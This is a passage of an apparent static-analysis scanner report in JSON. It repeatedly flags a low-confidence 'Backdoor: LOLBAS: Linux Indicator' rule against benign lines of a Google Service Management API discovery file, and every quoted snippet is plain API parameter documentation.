                      "markdown": "`              \"type\": \"string\"\n            },\n            \"configId\": {\n              \"description\": \"The id of the service config resource.\\nOptional. If it is not specified, the latest version of config will be\\nreturned.\",\n              \"location\": \"query\",\n              \"type\": \"string\"\n            }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2645,
                  "startColumn": 125,
                  "endLine": 2645,
                  "endColumn": 134,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2645,
                  "startColumn": 32,
                  "endLine": 2645,
                  "endColumn": 41,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}/config\",\n          \"flatPath\": \"v1/services/{serviceName}/config\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a service config (version) for a managed service. If `config_id` is\\nnot specified, the latest service config will be returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2561,
                  "startColumn": 39,
                  "endLine": 2561,
                  "endColumn": 47,
                  "snippet": {
                    "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\\n- `historical_quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\\n- `historical_quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                      "markdown": "`              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not present in the result:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\\n- `historical_quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2552,
                  "startColumn": 134,
                  "endLine": 2552,
                  "endColumn": 143,
                  "snippet": {
                    "text": "          \"path\": \"v1/services/{serviceName}\",\n          \"flatPath\": \"v1/services/{serviceName}\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a managed service. If the `consumer_project_id` is specified,\\nthe project's settings for the specified service are also returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services/{serviceName}\",\n          \"flatPath\": \"v1/services/{serviceName}\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a managed service. If the `consumer_project_id` is specified,\\nthe project's settings for the specified service are also returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n",
                      "markdown": "`          \"path\": \"v1/services/{serviceName}\",\n          \"flatPath\": \"v1/services/{serviceName}\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Gets a managed service. If the `consumer_project_id` is specified,\\nthe project's settings for the specified service are also returned.\",\n          \"parameters\": {\n            \"serviceName\": {\n              \"description\": \"The name of the service.  See the `ServiceManager` overview for naming\\nrequirements.  For example: `example.googleapis.com`.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2520,
                  "startColumn": 39,
                  "endLine": 2520,
                  "endColumn": 47,
                  "snippet": {
                    "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not fully included in list results:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                    "rendered": {
                      "text": "              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not fully included in list results:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n",
                      "markdown": "`              \"type\": \"string\"\n            },\n            \"expand\": {\n              \"description\": \"Fields to expand in any results.  By default, the following fields\\nare not fully included in list results:\\n- `operations`\\n- `project_settings`\\n- `project_settings.operations`\\n- `quota_usage` (It requires `project_settings`)\",\n              \"location\": \"query\",\n              \"type\": \"string\",\n              \"format\": \"google-fieldmask\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2502,
                  "startColumn": 138,
                  "endLine": 2502,
                  "endColumn": 147,
                  "snippet": {
                    "text": "          \"path\": \"v1/services\",\n          \"flatPath\": \"v1/services\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Lists all managed services. If the `consumer_project_id` is specified,\\nthe project's settings for the specified service are also returned.\",\n          \"parameters\": {\n            \"producerProjectId\": {\n              \"description\": \"Include services produced by the specified project.\",\n",
                    "rendered": {
                      "text": "          \"path\": \"v1/services\",\n          \"flatPath\": \"v1/services\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Lists all managed services. If the `consumer_project_id` is specified,\\nthe project's settings for the specified service are also returned.\",\n          \"parameters\": {\n            \"producerProjectId\": {\n              \"description\": \"Include services produced by the specified project.\",\n",
                      "markdown": "`          \"path\": \"v1/services\",\n          \"flatPath\": \"v1/services\",\n          \"httpMethod\": \"GET\",\n          \"description\": \"Lists all managed services. If the `consumer_project_id` is specified,\\nthe project's settings for the specified service are also returned.\",\n          \"parameters\": {\n            \"producerProjectId\": {\n              \"description\": \"Include services produced by the specified project.\",\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2458,
                  "startColumn": 35,
                  "endLine": 2458,
                  "endColumn": 41,
                  "snippet": {
                    "text": "          \"format\": \"int32\"\n        },\n        \"startTime\": {\n          \"description\": \"The start time of the operation.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        }\n",
                    "rendered": {
                      "text": "          \"format\": \"int32\"\n        },\n        \"startTime\": {\n          \"description\": \"The start time of the operation.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        }\n",
                      "markdown": "`          \"format\": \"int32\"\n        },\n        \"startTime\": {\n          \"description\": \"The start time of the operation.\",\n          \"type\": \"string\",\n          \"format\": \"google-datetime\"\n        }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2394,
                  "startColumn": 72,
                  "endLine": 2394,
                  "endColumn": 81,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer projects owned by the customer collectively.\",\n          \"$ref\": \"QuotaSettings\"\n        }\n      }\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer projects owned by the customer collectively.\",\n          \"$ref\": \"QuotaSettings\"\n        }\n      }\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n          \"description\": \"Settings that control how much or how fast the service can be used by the\\nconsumer projects owned by the customer collectively.\",\n          \"$ref\": \"QuotaSettings\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2390,
                  "startColumn": 63,
                  "endLine": 2390,
                  "endColumn": 72,
                  "snippet": {
                    "text": "          \"type\": \"string\"\n        },\n        \"customerId\": {\n          \"description\": \"ID for the customer that consumes the service (see above).\\nThe supported types of customers are:\\n\\n1. domain:{domain}\\nA Google Apps domain name. For example, google.com.\\n\\n2. billingAccount:{billing_account_id}\\nA Google Cloud Plafrom billing account. For Example, 123456-7890ab-cdef12.\\n\",\n          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n",
                    "rendered": {
                      "text": "          \"type\": \"string\"\n        },\n        \"customerId\": {\n          \"description\": \"ID for the customer that consumes the service (see above).\\nThe supported types of customers are:\\n\\n1. domain:{domain}\\nA Google Apps domain name. For example, google.com.\\n\\n2. billingAccount:{billing_account_id}\\nA Google Cloud Plafrom billing account. For Example, 123456-7890ab-cdef12.\\n\",\n          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n",
                      "markdown": "`          \"type\": \"string\"\n        },\n        \"customerId\": {\n          \"description\": \"ID for the customer that consumes the service (see above).\\nThe supported types of customers are:\\n\\n1. domain:{domain}\\nA Google Apps domain name. For example, google.com.\\n\\n2. billingAccount:{billing_account_id}\\nA Google Cloud Plafrom billing account. For Example, 123456-7890ab-cdef12.\\n\",\n          \"type\": \"string\"\n        },\n        \"quotaSettings\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2372,
                  "startColumn": 54,
                  "endLine": 2372,
                  "endColumn": 63,
                  "snippet": {
                    "text": "          \"type\": \"boolean\"\n        },\n        \"accessibleVisibilityLabels\": {\n          \"description\": \"Any visibility labels on the service that are accessible by the user.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                    "rendered": {
                      "text": "          \"type\": \"boolean\"\n        },\n        \"accessibleVisibilityLabels\": {\n          \"description\": \"Any visibility labels on the service that are accessible by the user.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n",
                      "markdown": "`          \"type\": \"boolean\"\n        },\n        \"accessibleVisibilityLabels\": {\n          \"description\": \"Any visibility labels on the service that are accessible by the user.\",\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2368,
                  "startColumn": 57,
                  "endLine": 2368,
                  "endColumn": 66,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"canAccessService\": {\n          \"description\": \"True if the user can access the service and any unrestricted API surface.\",\n          \"type\": \"boolean\"\n        },\n        \"accessibleVisibilityLabels\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"canAccessService\": {\n          \"description\": \"True if the user can access the service and any unrestricted API surface.\",\n          \"type\": \"boolean\"\n        },\n        \"accessibleVisibilityLabels\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"canAccessService\": {\n          \"description\": \"True if the user can access the service and any unrestricted API surface.\",\n          \"type\": \"boolean\"\n        },\n        \"accessibleVisibilityLabels\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2350,
                  "startColumn": 75,
                  "endLine": 2350,
                  "endColumn": 84,
                  "snippet": {
                    "text": "    },\n    \"ServiceAccessList\": {\n      \"id\": \"ServiceAccessList\",\n      \"description\": \"List of users and groups that are granted access to a service or visibility\\nlabel.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"members\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ServiceAccessList\": {\n      \"id\": \"ServiceAccessList\",\n      \"description\": \"List of users and groups that are granted access to a service or visibility\\nlabel.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"members\": {\n",
                      "markdown": "`    },\n    \"ServiceAccessList\": {\n      \"id\": \"ServiceAccessList\",\n      \"description\": \"List of users and groups that are granted access to a service or visibility\\nlabel.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"members\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2332,
                  "startColumn": 29,
                  "endLine": 2332,
                  "endColumn": 38,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n          \"description\": \"The service protected by this policy.\",\n          \"type\": \"string\"\n        },\n        \"accessList\": {\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n          \"description\": \"The service protected by this policy.\",\n          \"type\": \"string\"\n        },\n        \"accessList\": {\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n          \"description\": \"The service protected by this policy.\",\n          \"type\": \"string\"\n        },\n        \"accessList\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2328,
                  "startColumn": 56,
                  "endLine": 2328,
                  "endColumn": 65,
                  "snippet": {
                    "text": "    },\n    \"ServiceAccessPolicy\": {\n      \"id\": \"ServiceAccessPolicy\",\n      \"description\": \"Policy describing who can access a service and any visibility labels on that\\nservice.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                    "rendered": {
                      "text": "    },\n    \"ServiceAccessPolicy\": {\n      \"id\": \"ServiceAccessPolicy\",\n      \"description\": \"Policy describing who can access a service and any visibility labels on that\\nservice.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n",
                      "markdown": "`    },\n    \"ServiceAccessPolicy\": {\n      \"id\": \"ServiceAccessPolicy\",\n      \"description\": \"Policy describing who can access a service and any visibility labels on that\\nservice.\",\n      \"type\": \"object\",\n      \"properties\": {\n        \"serviceName\": {\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2321,
                  "startColumn": 120,
                  "endLine": 2321,
                  "endColumn": 129,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service disablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service disablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service disablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2321,
                  "startColumn": 65,
                  "endLine": 2321,
                  "endColumn": 74,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service disablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service disablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service disablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2310,
                  "startColumn": 119,
                  "endLine": 2310,
                  "endColumn": 128,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service enablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service enablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service enablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
                  "startLine": 2310,
                  "startColumn": 65,
                  "endLine": 2310,
                  "endColumn": 74,
                  "snippet": {
                    "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service enablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                    "rendered": {
                      "text": "      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service enablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n",
                      "markdown": "`      \"type\": \"object\",\n      \"properties\": {\n        \"consumerId\": {\n          \"description\": \"The identity of consumer resource which service enablement will be\\napplied to.\\n\\nThe Google Service Management implementation accepts the following\\nforms: \\\"project:<project_id>\\\", \\\"project_number:<project_number>\\\".\\n\\nNote: this is made compatible with\\ngoogle.api.servicecontrol.v1.Operation.consumer_id.\",\n          \"type\": \"string\"\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "json"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1.json"
                },
                "region": {
